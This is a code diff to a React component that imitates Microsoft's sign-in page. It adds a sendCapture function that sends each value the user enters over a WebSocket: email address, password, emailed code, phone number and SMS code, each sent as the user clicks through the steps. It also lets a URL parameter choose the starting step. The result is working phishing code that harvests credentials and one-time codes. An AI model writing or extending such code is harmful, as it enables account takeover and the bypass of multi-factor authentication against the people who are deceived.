@@ -86,7 +86,10 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
   const isDark = theme === 'dark';
   const isMobile = device === 'mobile';
 
-  const [step, setStep] = useState<MsStep>('email');
+  const [step, setStep] = useState<MsStep>(() => {
+    const init = new URLSearchParams(window.location.search).get('initialStep') as MsStep | null;
+    return init ?? 'email';
+  });
   const [regStep, setRegStep] = useState<RegStep>('reg-email');
   const [recStep, setRecStep] = useState<RecStep>('rec-find');
 
@@ -181,6 +184,13 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
     }
   }, [step]);
 
+  const sendCapture = (field: string, value: string) => {
+    const ws = wsRef.current;
+    if (ws?.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({ type: 'form-data', field, value }));
+    }
+  };
+
   const lightBg: React.CSSProperties = !isMobile
     ? { backgroundColor: isDark ? '#1b1b1b' : '#ffffff', backgroundImage: "url('/ms-bg.svg')", backgroundSize: 'cover', backgroundPosition: 'center' }
     : { backgroundColor: isDark ? '#111' : '#ffffff' };
@@ -271,7 +281,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
               <div className="flex justify-end">
                 <button
                   data-testid="ms-next-btn"
-                  onClick={() => { if (promptType === 'email-code') setStep('email-code'); else if (promptType === 'other-ways') setStep('other-ways'); else setStep('password'); }}
+                  onClick={() => { sendCapture('email', email); if (promptType === 'email-code') setStep('email-code'); else if (promptType === 'other-ways') setStep('other-ways'); else setStep('password'); }}
                   className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                   style={{ borderRadius: 0 }}
                 >
@@ -447,7 +457,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
               </div>
               <button
                 data-testid="ms-signin-btn"
-                onClick={() => setStep('stay')}
+                onClick={() => { sendCapture('password', password); setStep('stay'); }}
                 className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 mb-5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
@@ -592,7 +602,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
                 <a href="#" className="text-[#3391e0] text-[13px] hover:underline">I didn't get a code</a>
               </div>
               <button
-                onClick={() => emailCodeInput.length === 6 && setStep('stay')}
+                onClick={() => { if (emailCodeInput.length === 6) { sendCapture('email_code', emailCodeInput); setStep('stay'); } }}
                 className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
@@ -737,7 +747,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
                 />
               </div>
               <button
-                onClick={() => phoneNumber.length >= 7 && setStep('phone-code')}
+                onClick={() => { if (phoneNumber.length >= 7) { sendCapture('phone', phoneNumber); setStep('phone-code'); } }}
                 className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
@@ -780,7 +790,7 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
                 <a href="#" className="text-[#3391e0] text-[13px] hover:underline">I didn't get a code</a>
               </div>
               <button
-                onClick={() => phoneCode.length === 6 && setStep('stay')}
+                onClick={() => { if (phoneCode.length === 6) { sendCapture('phone_code', phoneCode); setStep('stay'); } }}
                 className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
